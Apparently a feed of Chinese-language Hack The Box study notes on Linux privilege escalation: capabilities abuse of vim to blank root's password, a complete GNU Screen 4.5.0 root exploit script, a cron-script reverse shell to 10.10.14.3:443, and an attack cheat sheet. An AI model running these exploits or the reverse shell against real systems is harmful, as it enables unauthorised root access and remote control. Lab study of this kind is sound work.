/usr/bin/vim.basic</code></pre><p>当为二进制文件设置了功能时，这意味着二进制文件将能够执行特定的操作，而如果没有这些功能，它将无法执行这些操作。例如，如果为二进制文件设置了cap_net_bind_service功能，则该二进制文件将能够绑定到网络端口，这是一种通常受到限制的特权。 某些功能，如cap_sys_admin，允许可执行文件以管理权限执行操作，如果使用不当，可能会造成危险。例如，我们可以利用它们来提升其权限、获取对敏感信息的访问权限或执行未经授权的操作。因此，为适当的沙盒和隔离的可执行文件设置这些类型的功能并避免不必要地授予它们是至关重要的。</p><table><thead><tr><th><strong>能力</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>cap_sys_admin</code></td><td>允许使用管理权限执行操作，例如修改系统文件或更改系统设置。</td></tr><tr><td><code>cap_sys_chroot</code></td><td>允许更改当前进程的根目录，允许它访问原本无法访问的文件和目录。</td></tr><tr><td><code>cap_sys_ptrace</code></td><td>允许附加到和调试其他进程，可能允许它访问敏感信息或修改其他进程的行为。</td></tr><tr><td><code>cap_sys_nice</code></td><td>允许提高或降低进程的优先级，从而可能允许它访问原本会受到限制的资源。</td></tr><tr><td><code>cap_sys_time</code></td><td>允许修改系统时钟，可能允许它操纵时间戳或导致其他进程以意外方式运行。</td></tr><tr><td><code>cap_sys_resource</code></td><td>允许修改系统资源限制，例如打开文件描述符的最大数量或可以分配的最大内存量。</td></tr><tr><td><code>cap_sys_module</code></td><td>允许加载和卸载内核模块，可能允许它修改操作系统的行为或访问敏感信息。</td></tr><tr><td><code>cap_net_bind_service</code></td><td>允许绑定到网络端口，可能允许它访问敏感信息或执行未经授权的操作。</td></tr></tbody></table><table><thead><tr><th><strong>能力值</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>=</code></td><td>此值为可执行文件设置指定的功能，但不授予任何权限。如果我们想清除可执行文件先前设置的功能，这会很有用。</td></tr><tr><td><code>+ep</code></td><td>此值向可执行文件授予指定功能的有效和允许的权限。这允许可执行文件执行该功能允许的操作，但不允许它执行功能不允许的任何操作。</td></tr><tr><td><code>+ei</code></td><td>此值为可执行文件的指定功能授予足够的可继承权限。这允许可执行文件执行该功能允许的操作，以及可执行文件生成的子进程继承功能并执行相同的操作。</td></tr><tr><td><code>+p</code></td><td>此值向可执行文件授予指定功能的允许权限。这允许可执行文件执行该功能允许的操作，但不允许它执行功能不允许的任何操作。如果我们想要向可执行文件授予功能，但阻止它继承该功能或允许子进程继承它，这可能很有用。</td></tr></tbody></table><table><thead><tr><th><strong>能力</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>CAP_SETUID</code></td><td>允许进程设置其有效用户 ID，该 ID 可用于获取其他用户（包括该用户）的特权。<code>root</code></td></tr><tr><td><code>CAP_SETGID</code></td><td>允许设置其有效组 ID，可用于获取另一个组（包括该组）的权限。<code>root</code></td></tr><tr><td><code>CAP_SYS_ADMIN</code></td><td>此功能提供了广泛的管理权限，包括能够执行为用户保留的许多操作，例如修改系统设置以及挂载和卸载文件系统。<code>root</code></td></tr></tbody></table><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>如果我们使用低权限帐户访问了系统，但没有cap_sys_admin功能：</p><h4 id="Exploiting-Capabilities"><a href="#Exploiting-Capabilities" class="headerlink" title="Exploiting Capabilities"></a>Exploiting Capabilities</h4><pre><code class="shell-session">Tanin@htb[/htb]$ getcap /usr/bin/vim.basic/usr/bin/vim.basic cap_dac_override=eip</code></pre><p>例如，&#x2F;usr&#x2F;bin&#x2F;vim.basic二进制文件在没有特殊权限的情况下运行，例如使用sudo。然而，由于二进制文件具有cap_sys_admin功能集，因此它可以提升运行它的用户的权限。这将允许渗透测试人员获得cap_sys_admin功能并执行需要此功能的任务。 让我们看看&#x2F;etc&#x2F;passwd文件，其中指定了用户root：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/passwd | head -n1root:x:0:0:root:/root:/bin/bash</code></pre><p>我们可以使用&#x2F;usr&#x2F;bin&#x2F;vim二进制文件的cap_sys_admin功能来修改系统文件：</p><pre><code class="shell-session">Tanin@htb[/htb]$ /usr/bin/vim.basic /etc/passwd</code></pre><p>我们还可以在非交互式模式下进行这些更改：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo -e &#39;:%s/^root:[^:]*:/root::/\nwq&#39; | /usr/bin/vim.basic -es /etc/passwdTanin@htb[/htb]$ cat /etc/passwd | head -n1</code></pre><blockquote><p><code>vim -es</code> 是用于以批处理（非交互式）模式运行 Vim 编辑器的命令。在这个模式下，Vim 将在不显示图形用户界面（GUI）的情况下运行，并执行指定的编辑操作或脚本，然后退出。这种模式通常用于自动化编辑任务、批量处理文本文件或在脚本中使用 Vim。</p><p>解释一下命令中的选项：</p><ul><li><p><code>vim</code>：是 Vim 编辑器的命令。</p></li><li><pre><code>-es</code></pre><p>：是 Vim 的选项之一，它表示启动 Vim 编辑器并进入批处理模式。</p><ul><li><code>-e</code>：表示以 Ex 模式启动 Vim，该模式是 Vim 的批处理编辑模式，不显示交互式界面。</li><li><code>-s</code>：表示将 Vim 当作脚本执行。这个选项需要与 <code>-e</code> 一起使用，将 Vim 用于自动化编辑任务和批量处理。</li></ul></li></ul><p>使用 <code>vim -es</code> 后，可以通过标准输入或文件输入来执行编辑操作或脚本。例如，可以通过输入 Ex 命令来编辑文件、搜索和替换文本等，然后退出 Vim。</p></blockquote><p>现在，我们可以看到这一行中的x已经不见了，这意味着我们可以使用命令su以root身份登录，而无需询问密码。</p><blockquote><p>在 Linux 系统中，<code>/etc/passwd</code> 文件中的每一行描述一个用户账号的信息，以冒号分隔字段。其中，<code>root:x:0:0:root:/root:/bin/bash</code> 这一行表示 <code>root</code> 用户的账号信息。</p><ul><li>第一个字段 <code>root</code> 是用户名，表示账号的登录名。</li><li>第二个字段 <code>x</code> 是密码字段。在过去，密码是以明文存储在 <code>/etc/passwd</code> 文件中，但为了增加安全性，现代系统一般将密码存储在 <code>/etc/shadow</code> 文件中，而在 <code>/etc/passwd</code> 文件中用 <code>x</code> 占位。真正的密码哈希值存储在 <code>/etc/shadow</code> 文件中，只有超级用户（通常是 <code>root</code> 用户）可以访问该文件。</li><li>第三个字段 <code>0</code> 是用户ID（UID，User ID）。<code>0</code> 表示 <code>root</code> 用户的用户ID，<code>0</code> 是预留给超级用户（root）的特殊用户ID。</li><li>第四个字段 <code>0</code> 是组ID（GID，Group ID）。同样，<code>0</code> 表示 <code>root</code> 用户所属的组ID，即预留给超级用户组的特殊组ID。</li><li>第五个字段 <code>root</code> 是用户的全名或注释字段，通常是对用户的描述。</li><li>第六个字段 <code>/root</code> 是用户的主目录，即 <code>root</code> 用户的家目录。</li><li>第七个字段 <code>/bin/bash</code> 是用户登录后使用的默认 shell。</li></ul><p>在现代系统中，密码字段中的 <code>x</code> 表示密码信息存储在 <code>/etc/shadow</code> 文件中，因此 <code>/etc/passwd</code> 中并不包含实际的密码信息。这样可以增加系统的安全性，因为只有超级用户才能访问 <code>/etc/shadow</code> 文件，一般用户无法获取到真正的密码哈希值。</p></blockquote><p>现在，我们可以看到这一行中的x已经不见了，这意味着我们可以使用命令su以root身份登录，而无需询问密码。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> <strong>Escalate the privileges using capabilities and read the flag.txt file in the “&#x2F;root” directory. Submit its contents as the answer.</strong></p><p>这里跟上面的示例差不多，唯一的区别是在修改passwd文件时需要使用wq！退出才能有效</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307161934479.png" alt="image-20230716193413383"></p><blockquote><p>在 Vim 中，<code>:wq!</code> 和 <code>:wq</code> 是两个不同的命令，分别用于保存文件并退出 Vim。</p><ol><li><code>:wq!</code>：这个命令用于保存文件并强制退出 Vim。如果当前编辑的文件没有写权限或者是只读文件，或者 Vim 检测到文件已被修改但未保存，<code>:wq!</code> 命令会强制保存文件并退出编辑器。如果文件是只读的，会提示是否保存为另一个文件。</li><li><code>:wq</code>：这个命令用于保存文件并退出 Vim。如果当前编辑的文件有写权限且没有被其他程序锁定，并且没有未保存的修改，<code>:wq</code> 命令会保存文件并退出编辑器。如果文件是只读的或者有未保存的修改，Vim 会给出相应的提示并不会退出编辑器。</li></ol><p>在 Vim 中，冒号 <code>:</code> 是用于输入命令的前缀符号。要使用上述命令，需要按下 Esc 键以确保退出插入模式，然后在 Normal 模式下输入 <code>:wq!</code> 或 <code>:wq</code>，然后按 Enter 键执行相应的命令。</p><p>综上所述，<code>wq!</code> 和 <code>wq</code> 在功能上的区别主要是 <code>!</code> 的作用，用于强制执行保存操作。</p></blockquote><p>这里再解释一下：</p><blockquote><p><code>:%s/^root:[^:]*:/root::/</code> 是 Vim 编辑器的替换命令，用于在编辑器中对文本进行查找和替换操作。解析如下：</p><ul><li><p><code>:</code>：冒号是进入 Vim 的命令行模式的前缀符号。</p></li><li><p><code>%</code>：在 Vim 中 <code>%</code> 表示全局范围，用于指定查找和替换操作在整个文件中执行。</p></li><li><p><code>s</code>：<code>s</code> 是替换命令的简写，用于执行查找和替换操作。</p></li><li><pre><code>/^root:[^:]*:/</code></pre><p>：这是查找模式，用于匹配以 </p><pre><code>root:</code></pre><p> 开头的文本。解析如下：</p><ul><li><code>^</code>：表示匹配行的开头。</li><li><code>root:</code>：表示要匹配的文本以 <code>root:</code> 开头。</li><li><code>[^:]*</code>：表示匹配零个或多个非冒号字符，即匹配 <code>root:</code> 后的用户名。</li><li><code>:</code>：表示匹配冒号。</li></ul></li><li><pre><code>/root::/</code></pre><p>：这是替换模式，用于将匹配的文本替换为 </p><pre><code>root::</code></pre><p>。解析如下：</p><ul><li><code>root::</code>：表示要替换的文本为 <code>root::</code>，即清空密码字段。</li></ul></li></ul></blockquote><h1 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h1><h4 id="Screen-Version-Identification"><a href="#Screen-Version-Identification" class="headerlink" title="Screen Version Identification"></a>Screen Version Identification</h4><pre><code class="shell-session">Tanin@htb[/htb]$ screen -vScreen version 4.05.00 (GNU) 10-Dec-16</code></pre><p>4.5.0版本存在权限提升漏洞，原因是打开日志文件时缺少权限检查。</p><p>这使攻击者能够截断任何文件或在任何目录中创建root拥有的文件，并最终获得完全的root访问权限。</p><h4 id="Privilege-Escalation-Screen-Exploit-sh"><a href="#Privilege-Escalation-Screen-Exploit-sh" class="headerlink" title="Privilege Escalation - Screen_Exploit.sh"></a>Privilege Escalation - Screen_Exploit.sh</h4><pre><code class="bash">#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017)echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we create our shell and library...&quot;cat &lt;&lt; EOF &gt; /tmp/libhax.c#include &lt;stdio.h&gt;#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/stat.h&gt;__attribute__ ((__constructor__))void dropshell(void)&#123;    chown(&quot;/tmp/rootshell&quot;, 0, 0);    chmod(&quot;/tmp/rootshell&quot;, 04755);    unlink(&quot;/etc/ld.so.preload&quot;);    printf(&quot;[+] done!\n&quot;);&#125;EOFgcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.crm -f /tmp/libhax.ccat &lt;&lt; EOF &gt; /tmp/rootshell.c#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;/bin/sh&quot;, NULL, NULL);&#125;EOFgcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declarationrm -f /tmp/rootshell.cecho &quot;[+] Now we create our /etc/ld.so.preload file...&quot;cd /etcumask 000 # becausescreen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline neededecho &quot;[+] Triggering...&quot;screen -ls # screen itself is setuid, so.../tmp/rootshell</code></pre><h1 id="Cron-Job-Abuse"><a href="#Cron-Job-Abuse" class="headerlink" title="Cron Job Abuse"></a>Cron Job Abuse</h1><p>Cron作业也可以设置为一次性运行（例如在启动时）。它们通常用于管理任务，如运行备份、清理目录等。crontab命令可以创建一个cron文件，该文件将由cron守护进程按照指定的时间表运行。创建cron文件时，将在&#x2F;var&#x2F;spool&#x2F;cron中为创建该文件的特定用户创建该文件。crontab文件中的每个条目都需要六个项目，顺序如下：分钟、小时、天、月、周、命令。例如，条目0*&#x2F;12***&#x2F;home&#x2F;admin&#x2F;backup.sh将每12小时运行一次。 root crontab几乎总是只能由root用户或具有完全sudo权限的用户编辑；然而，它仍然可以被滥用。您可能会找到一个以root身份运行的可写脚本，即使您无法读取crontab以了解确切的时间表，您也可以确定它的运行频率（即，每12小时创建一个.tar.gz文件的备份脚本）。在这种情况下，您可以将一个命令附加到脚本的末尾（例如反向shell一行），它将在下次运行cron作业时执行。</p><p>某些应用程序在&#x2F;etc&#x2F;cron.d目录中创建cron文件，并且可能被错误配置为允许非root用户编辑这些文件。 首先，让我们在系统中查找任何可写文件或目录。&#x2F;dmz backups目录中的文件backup.sh很有趣，看起来它可能运行在cron作业上。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null/etc/cron.daily/backup/dmz-backups/backup.sh/proc/sys/fs/cgroup/memory/init.scope/cgroup.event_control&lt;SNIP&gt;/home/backupsvc/backup.sh&lt;SNIP&gt;</code></pre><p>在&#x2F;dmz&#x2F;backups目录中快速查看一下，会显示每三分钟创建一次的文件。这似乎是一个重大的错误配置。也许sysadmin的意思是指定每三个小时一次，比如0*&#x2F;3<strong><em>，但写的是</em>&#x2F;3</strong>**，它告诉cron作业每三分钟运行一次。第二个问题是backup.sh shell脚本是全局可写的，并且以root身份运行。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /dmz-backups/total 36drwxrwxrwx  2 root root 4096 Aug 31 02:39 .drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..-rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh</code></pre><p>我们可以使用<a href="https://github.com/DominicBreuker/pspy">pspy</a>确认cron作业正在运行，pspy是一种命令行工具，用于查看正在运行的进程，而不需要root权限。我们可以使用它来查看其他用户运行的命令、cron作业等。它通过扫描procfs来工作。 让我们运行pspy并看看。-pf标志告诉工具打印命令和文件系统事件，-i 1000告诉它每隔1000毫秒（或每秒）扫描一次 <a href="https://en.wikipedia.org/wiki/Procfs">procfs</a>。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ./pspy64 -pf -i 1000pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</code></pre><pre><code class="shell-session">Tanin@htb[/htb]$ cat /dmz-backups/backup.sh #!/bin/bash SRCDIR=&quot;/var/www/html&quot; DESTDIR=&quot;/dmz-backups/&quot; FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR</code></pre><p>我们可以看到，脚本只是将源目录和目标目录作为变量。然后，它指定一个带有当前备份日期和时间的文件名，并创建源目录（web根目录）的tarball。让我们修改这个脚本，添加一个Bash单行反向shell。</p><pre><code class="bash">#!/bin/bashSRCDIR=&quot;/var/www/html&quot;DESTDIR=&quot;/dmz-backups/&quot;FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgztar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR bash -i &gt;&amp; /dev/tcp/10.10.14.3/443 0&gt;&amp;1</code></pre><blockquote><ul><li><code>bash -i</code>：启动一个交互式的 Bash shell，<code>-i</code> 表示进入交互模式。</li><li><code>&gt;&amp;</code>：将标准输出和标准错误输出合并为一个输出流。</li><li><code>/dev/tcp/10.10.14.3/443</code>：这是特殊的 Bash 设备文件，表示将数据发送到指定的 IP 地址和端口。在这里，它指定将输出流发送到 IP 地址为 <code>10.10.14.3</code> 的主机的 443 端口。</li><li><code>0&gt;&amp;1</code>：将标准输入重定向到与标准输出合并的输出流，实现双向通信。</li></ul></blockquote><h1 id="备忘单"><a href="#备忘单" class="headerlink" title="备忘单"></a>备忘单</h1><p>备忘单是此模块的有用命令参考。</p><table><thead><tr><th><strong>命令</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>ssh htb-student@&lt;target IP&gt;</code></td><td>通过 SSH 连接到实验室目标</td></tr><tr><td>&#96;ps aux</td><td>grep root&#96;</td></tr><tr><td><code>ps au</code></td><td>查看已登录的用户</td></tr><tr><td><code>ls /home</code></td><td>查看用户主目录</td></tr><tr><td><code>ls -l ~/.ssh</code></td><td>检查当前用户的 SSH 密钥</td></tr><tr><td><code>history</code></td><td>检查当前用户的 Bash 历史记录</td></tr><tr><td><code>sudo -l</code></td><td>用户可以以其他用户的身份运行任何内容吗？</td></tr><tr><td><code>ls -la /etc/cron.daily</code></td><td>检查每日 Cron 作业</td></tr><tr><td><code>lsblk</code></td><td>检查未挂载的文件系统&#x2F;驱动器</td></tr><tr><td><code>find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</code></td><td>查找全局可写目录</td></tr><tr><td><code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code></td><td>查找全局可写文件</td></tr><tr><td><code>uname -a</code></td><td>检查内核版本</td></tr><tr><td><code>cat /etc/lsb-release</code></td><td>检查操作系统版本</td></tr><tr><td><code>gcc kernel_expoit.c -o kernel_expoit</code></td><td>编译用 C 编写的漏洞利用</td></tr><tr><td><code>screen -v</code></td><td>检查已安装的 版本<code>Screen</code></td></tr><tr><td><code>./pspy64 -pf -i 1000</code></td><td>查看正在运行的进程<code>pspy</code></td></tr><tr><td><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></td><td>查找设置了 SUID 位的二进制文件</td></tr><tr><td><code>find / -user root -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></td><td>查找设置了 SETGID 位的二进制文件</td></tr><tr><td><code>sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></td><td>私人与<code>tcpdump</code></td></tr><tr><td><code>echo $PATH</code></td><td>检查当前用户的 PATH 变量内容</td></tr><tr><td><code>PATH=.:$&#123;PATH&#125;</code></td><td>在当前用户的 PATH 开头添加<code>.</code></td></tr><tr><td><code>find / ! -path &quot;*/proc/*&quot; -iname &quot;*config*&quot; -type f 2&gt;/dev/null</code></td><td>搜索配置文件</td></tr><tr><td><code>ldd /bin/ls</code></td><td>查看二进制文件所需的共享对象</td></tr><tr><td><code>sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</code></td><td>使用 提升权限<code>LD_PRELOAD</code></td></tr><tr><td>&#96;readelf -d payroll</td><td>grep PATH&#96;</td></tr><tr><td><code>gcc src.c -fPIC -shared -o /development/libshared.so</code></td><td>编译共享库</td></tr><tr><td><code>lxd init</code></td><td>启动 LXD 初始化过程</td></tr><tr><td><code>lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></td><td>导入本地镜像</td></tr><tr><td><code>lxc init alpine r00t -c security.privileged=true</code></td><td>启动特权 LXD 容器</td></tr><tr><td><code>lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</code></td><td>在容器中挂载主机文件系统</td></tr><tr><td><code>lxc start r00t</code></td><td>启动容器</td></tr><tr><td><code>showmount -e 10.129.2.12</code></td><td>显示 NFS 导出列表</td></tr><tr><td><code>sudo mount -t nfs 10.129.2.12:/tmp /mnt</code></td><td>在本地挂载 NFS 共享</td></tr><tr><td><code>tmux -S /shareds new -s debugsess</code></td><td>已创建共享会话套接字<code>tmux</code></td></tr><tr><td><code>./lynis audit system</code></td><td>使用 执行系统审核<code>Lynis</code></td></tr></tbody></table>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Path-Abuse&quot;&gt;&lt;a href=&quot;#Path-Abuse&quot; class=&quot;headerlink&quot; title=&quot;Path Abuse&quot;&gt;&lt;/a&gt;Path Abuse&lt;/h1&gt;&lt;p&gt;如果我们可以修改用户的路径，我们可以用恶意脚本（如反向shell）替换常见的二进制文件（如ls）。如果我们加上。通过发出命令path&amp;#x3D;.：$PATH，然后导出PATH，我们将能够通过键入文件名来运行位于当前工作目录中的二进制文件（即，仅键入ls将调用当前工作目录下名为ls的恶意脚本，而不是位于&amp;#x2F;bin&amp;#x2F;ls的二进制文件）。&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Linux_Privilege_Escalation-Information Gathering</title>
    <link href="https://taninluv.github.io/2023/07/15/Linux-Privilege-Escalation/"/>
    <id>https://taninluv.github.io/2023/07/15/Linux-Privilege-Escalation/</id>
    <published>2023-07-15T07:44:51.000Z</published>
    <updated>2023-07-16T03:39:46.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Environment-Enumeration"><a href="#Environment-Enumeration" class="headerlink" title="Environment Enumeration"></a>Environment Enumeration</h1><p>Linux系统上的根帐户提供对操作系统的完全管理级别访问。在评估过程中，您可能会在Linux主机上获得一个低特权shell，并且需要向根帐户执行权限提升。完全损害主机将使我们能够捕获流量并访问敏感文件，这些文件可能用于在环境中进一步访问。此外，如果Linux计算机已加入域，我们可以获得NTLM哈希并开始枚举和攻击Active Directory。</p><span id="more"></span><p>枚举：<a href="https://github.com/rebootuser/LinEnum">LinEnum</a></p><p>​ <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a></p><h4 id="List-Current-Processes"><a href="#List-Current-Processes" class="headerlink" title="List Current Processes"></a>List Current Processes</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ps aux | grep rootroot         1  1.3  0.1  37656  5664 ?        Ss   23:26   0:01 /sbin/initroot         2  0.0  0.0      0     0 ?        S    23:26   0:00 [kthreadd]root         3  0.0  0.0      0     0 ?        S    23:26   0:00 [ksoftirqd/0]root         4  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/0:0]root         5  0.0  0.0      0     0 ?        S&lt;   23:26   0:00 [kworker/0:0H]root         6  0.0  0.0      0     0 ?        S    23:26   0:00 [kworker/u8:0]root         7  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_sched]root         8  0.0  0.0      0     0 ?        S    23:26   0:00 [rcu_bh]root         9  0.0  0.0      0     0 ?        S    23:26   0:00 [migration/0]&lt;SNIP&gt;</code></pre><p>已安装的软件包和版本：与运行的服务一样，重要的是要检查是否有任何过期或易受攻击的软件包，这些软件包可能很容易用于权限提升。一个例子是Screen，它是一个常见的终端多路复用器（类似于tmux）。它允许您启动一个会话并打开许多窗口或虚拟终端，而不是打开多个终端会话。版本4.05.00存在权限提升漏洞，可轻松利用该漏洞提升权限。 </p><p>已登录用户：了解哪些其他用户已登录系统以及他们正在做什么，可以更深入地了解可能的本地横向移动和权限提升路径。 列出当前进程</p><pre><code class="shell-session">Tanin@htb[/htb]$ ps auUSER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMANDroot      1256  0.0  0.1  65832  3364 tty1     Ss   23:26   0:00 /bin/login --cliff.moore     1322  0.0  0.1  22600  5160 tty1     S    23:26   0:00 -bashshared     1367  0.0  0.1  22568  5116 pts/0    Ss   23:27   0:00 -bashroot      1384  0.0  0.1  52700  3812 tty1     S    23:29   0:00 sudo suroot      1385  0.0  0.1  52284  3448 tty1     S    23:29   0:00 suroot      1386  0.0  0.1  21224  3764 tty1     S+   23:29   0:00 bashshared     1397  0.0  0.1  37364  3428 pts/0    R+   23:30   0:00 ps au</code></pre><h4 id="Home-Directory-Contents"><a href="#Home-Directory-Contents" class="headerlink" title="Home Directory Contents"></a>Home Directory Contents</h4><h4 id="Home-Directory-Contents-1"><a href="#Home-Directory-Contents-1" class="headerlink" title="Home Directory Contents"></a>Home Directory Contents</h4><p>我们可以检查各个用户目录，检查诸如.bash_history文件之类的文件是否可读并包含任何有趣的命令，查找配置文件，并检查是否可以获得用户SSH密钥的副本。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /home/stacey.jenkins/total 32drwxr-xr-x 3 stacey.jenkins stacey.jenkins 4096 Aug 30 23:37 .drwxr-xr-x 9 root           root           4096 Aug 30 23:33 ..-rw------- 1 stacey.jenkins stacey.jenkins   41 Aug 30 23:35 .bash_history-rw-r--r-- 1 stacey.jenkins stacey.jenkins  220 Sep  1  2015 .bash_logout-rw-r--r-- 1 stacey.jenkins stacey.jenkins 3771 Sep  1  2015 .bashrc-rw-r--r-- 1 stacey.jenkins stacey.jenkins   97 Aug 30 23:37 config.json-rw-r--r-- 1 stacey.jenkins stacey.jenkins  655 May 16  2017 .profiledrwx------ 2 stacey.jenkins stacey.jenkins 4096 Aug 30 23:35 .ssh</code></pre><p>如果找到当前用户的SSH密钥，则可以使用该密钥在主机上打开SSH会话（如果SSH在外部公开），并获得稳定且完全交互的会话。SSH密钥也可以用来访问网络中的其他系统。至少，检查ARP缓存以查看正在访问的其他主机，并将这些主机与任何可用的SSH私钥进行交叉引用。</p><h4 id="Bash-History"><a href="#Bash-History" class="headerlink" title="Bash History"></a>Bash History</h4><pre><code class="shell-session">Tanin@htb[/htb]$ history    1  id    2  cd /home/cliff.moore    3  exit    4  touch backup.sh    5  tail /var/log/apache2/error.log    6  ssh ec2-user@dmz02.inlanefreight.local    7  history</code></pre><p>Sudo特权：用户可以以其他用户或root用户的身份运行任何命令吗？如果您没有用户的凭据，则可能无法利用sudo权限。然而，sudoer条目通常包括NOPASSWD，这意味着用户可以在不提示输入密码的情况下运行指定的命令。并非所有命令，即使我们可以以root身份运行，也会导致权限提升。以拥有完全sudo权限的用户身份获得访问权限并不罕见，这意味着他们可以以root用户身份运行任何命令。发出一个简单的sudo-su命令将立即为您提供一个根会话。</p><h4 id="Sudo-List-User’s-Privileges"><a href="#Sudo-List-User’s-Privileges" class="headerlink" title="Sudo - List User’s Privileges"></a>Sudo - List User’s Privileges</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo -lMatching Defaults entries for sysadm on NIX02:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser sysadm may run the following commands on NIX02:    (root) NOPASSWD: /usr/sbin/tcpdump</code></pre><p>配置文件：配置文件可以保存丰富的信息。值得在所有以.conf和.config等扩展名结尾的文件中搜索用户名、密码和其他机密。 </p><p>Shadow File：如果Shadow File是可读的，您将能够为所有设置了密码的用户收集密码哈希。虽然这不能保证进一步的访问，但这些哈希可能会受到离线暴力攻击，以恢复明文密码。</p><p> &#x2F;etc&#x2F;passwd中的密码哈希：偶尔，您会直接在&#x2F;etc&#x2F;passwd文件中看到密码哈希。该文件对所有用户都是可读的，与Shadow File中的哈希一样，这些用户可能会受到离线密码破解攻击。这种配置虽然不常见，但有时可以在嵌入式设备和路由器上看到。</p><p>Cron Jobs：Linux系统上的Cron作业类似于Windows计划任务。它们通常用于执行维护和备份任务。结合其他错误配置（如相对路径或弱权限），它们可以在计划的cron作业运行时利用这些错误配置来提升权限。</p><h4 id="Cron-Jobs"><a href="#Cron-Jobs" class="headerlink" title="Cron Jobs"></a>Cron Jobs</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ls -la /etc/cron.daily/total 60drwxr-xr-x  2 root root 4096 Aug 30 23:49 .drwxr-xr-x 93 root root 4096 Aug 30 23:47 ..-rwxr-xr-x  1 root root  376 Mar 31  2016 apport-rwxr-xr-x  1 root root 1474 Sep 26  2017 apt-compat-rwx--x--x  1 root root  379 Aug 30 23:49 backup-rwxr-xr-x  1 root root  355 May 22  2012 bsdmainutils-rwxr-xr-x  1 root root 1597 Nov 27  2015 dpkg-rwxr-xr-x  1 root root  372 May  6  2015 logrotate-rwxr-xr-x  1 root root 1293 Nov  6  2015 man-db-rwxr-xr-x  1 root root  539 Jul 16  2014 mdadm-rwxr-xr-x  1 root root  435 Nov 18  2014 mlocate-rwxr-xr-x  1 root root  249 Nov 12  2015 passwd-rw-r--r--  1 root root  102 Apr  5  2016 .placeholder-rwxr-xr-x  1 root root 3449 Feb 26  2016 popularity-contest-rwxr-xr-x  1 root root  214 May 24  2016 update-notifier-common</code></pre><h4 id="File-Systems-amp-Additional-Drives"><a href="#File-Systems-amp-Additional-Drives" class="headerlink" title="File Systems &amp; Additional Drives"></a>File Systems &amp; Additional Drives</h4><pre><code class="shell-session">Tanin@htb[/htb]$ lsblkNAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTsda      8:0    0   30G  0 disk ├─sda1   8:1    0   29G  0 part /├─sda2   8:2    0    1K  0 part └─sda5   8:5    0  975M  0 part [SWAP]sr0     11:0    1  848M  0 rom  </code></pre><p>SETUID和SETGID权限：二进制文件设置有这些权限，允许用户以root身份运行命令，而无需向用户授予root级别的访问权限。许多二进制文件包含可以用来获取根shell的功能。 </p><p>可写目录：如果您需要将工具下载到系统中，那么发现哪些目录是可写的非常重要。您可能会发现cron jobs放置文件的可写目录，该目录提供了cron作业运行频率的概念，如果cron jobs所运行的脚本也是可写的，则可用于提升权限。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -path /proc -prune -o -type d -perm -o+w 